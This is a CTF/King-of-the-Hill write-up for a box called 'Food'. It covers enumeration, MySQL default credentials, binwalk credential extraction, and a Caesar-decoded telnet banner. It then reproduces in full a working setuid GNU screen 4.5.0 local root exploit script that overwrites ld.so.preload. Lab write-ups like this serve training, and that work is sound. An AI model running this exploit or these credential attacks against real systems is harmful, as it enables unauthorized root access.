# KOTH

## Food 

Food was the first box that I rooted. This was a pretty fun and easy box.


First things first, a good old nmap scan, I used `nmap -sV [ip] -p-` so i could see the results of everything.


```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3306/tcp  open  mysql   MySQL 5.7.29-0ubuntu0.18.04.1
9999/tcp  open  abyss?
15065/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
16109/tcp open  unknown
46969/tcp open  telnet  Linux telnetd

```

You're given some ports, a http, unknown, and a telnet.


I decided to ignore the http, and go to mysql. Using the old default creds of `root:root`, I ran `mysql -h [ip] -u root -p` and got into the mysql server. 

After using `show databases;`

I changed to the Users database, and decided to run `select * from User;`

This gave me the creds for ramen and also gave me a flag. We love flags :)

<hr>

I wanted to get another user, as ramen was a bit crap in terms of privs. I then went to the second port, and guessed to go to a website with the port(putting http://[ip].16109 into my browser.) This gave me a picture.

Maybe there was some hidden data inside the image, so I ran `binwalk -e [filename]` on the image. I got a gzip, so I went into it and ran `binwalk -e [filename]` again.  This gave me pasta's creds.

I used SSH on pasta, and found some interesting things, that we'll get back to later :p


<hr> 

Finally, the final port, probably the easiest.

After running a quick telnet [IP] 46969, 

I get greeted by tccr:uwjsasqccywsg, which is obviously encrypted with a caesar cipher. Decrypting this, I get food creds. more creds for the collection!


<hr> 

Going back to pasta, I wanted to get a root shell. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md is an amazing resorce for helping to priv esc on linux. 

Using this to help, I ran `find / -uid 0 -perm -4000 -type f 2>/dev/null` to see some of those sweet sweet binaries.


Some of the binaries seemed sus, so I ran some great shellcode from here: https://www.exploit-db.com/exploits/41154

```sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```

I ran this, and decided to run a quick whoami to see who I was, and I was root.


Now go out, and blue team!
